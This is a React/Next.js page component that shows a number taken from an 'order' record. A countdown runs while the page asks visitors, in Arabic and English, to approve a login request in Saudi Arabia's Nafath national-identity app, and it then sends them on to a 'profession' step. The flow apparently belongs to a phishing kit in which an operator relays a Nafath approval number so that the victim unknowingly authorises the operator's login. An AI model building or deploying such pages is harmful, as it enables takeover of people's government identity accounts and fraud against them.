import { FaArrowRightLong } from 'react-icons/fa6'
import { useRouter, useSearchParams } from 'next/navigation'

import Link from 'next/link'
import { useCallback, useEffect, useState } from 'react'
import SwiperSlider from '@/components/SwiperSlider'

const NafatOtpTwo = () => {
  const router = useRouter()
  const params = useSearchParams()
  const _id = params.get('id')

  // get order data from api localhost:3000/api/order/:id
  const [order, setOrder] = useState([])

  const handleSubmit = (e) => {
    e.preventDefault()
    router.push({
      pathname: '/profession',
      query: { id: params.get('id') },
    })
  }

  // a countdown timer function
  const [time, setTime] = useState(180)

  const url = `${process.env.API_URL}/api/order/${_id}`

  const fetchOrder = useCallback(async () => {
    const response = await fetch(url)
    const data = await response.json()
    setOrder(data)
  }, [url])

  useEffect(() => {
    fetchOrder()
    const timer = setInterval(() => {
      setTime((prevTime) => {
        if (prevTime === 0) {
          clearInterval(timer)
          return 0
        }
        return prevTime - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [fetchOrder])

  const reload = () => {
    window.location.reload()
  }

  return (
    <>
      <SwiperSlider />
      <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
        <h1 className="text-4xl font-bold text-gray-600 mt-10">
          Nafath App OTP2
        </h1>

        {/* a countdown timer for 180s design */}
        <div className="flex justify-center items-center gap-2 mt-5 border-4 h-28 w-28 rounded-full">
          <h1 className="text-2xl font-bold text-gray-600 m-0">
            {Math.floor(time / 60)}:
          </h1>
          <h1 className="text-2xl font-bold text-gray-600 m-0">{time % 60}</h1>
        </div>

        <p className="text-gray-600 text-center mt-5 font-bold">
          رجى قبول طلب تسجيل الدخول من تطبيق نفاذ
        </p>
        <p className="text-gray-600 text-center my-5 font-bold">
          Please accept the login request from Nafath app
        </p>
        {/* a countdown design round border */}

        <div className="flex justify-center items-center gap-2 rounded-full border-2 h-16 w-16">
          <p className="text-gray-600 text-center m-0 font-bold">
            {order.nafatOtpTwo ? order.nafatOtpTwo : 'N/A'}
          </p>
        </div>

        <Link
          href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
          target="_blank"
          className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
        >
          OPEN NAFATH APP
        </Link>
        {/* {order.nafatOtpTwo ? ( */}
        <form onSubmit={handleSubmit} className="w-3/4 my-14">
          <button
            type="submit"
            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
          >
            Continue To Profession <FaArrowRightLong size={16} />
          </button>
        </form>
        {/* ) : (
          <button
            onClick={reload}
            className="flex gap-2 justify-center items-center rounded-sm font-bold my-14 w-3/4 px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-gray-500 hover:bg-gray-600 focus:outline-none focus:bg-gray-600"
          >
            Reload Page
          </button>
        )} */}
      </div>
      <div className="h-20 bg-teal-400 mt-5"></div>
    </>
  )
}

export default NafatOtpTwo
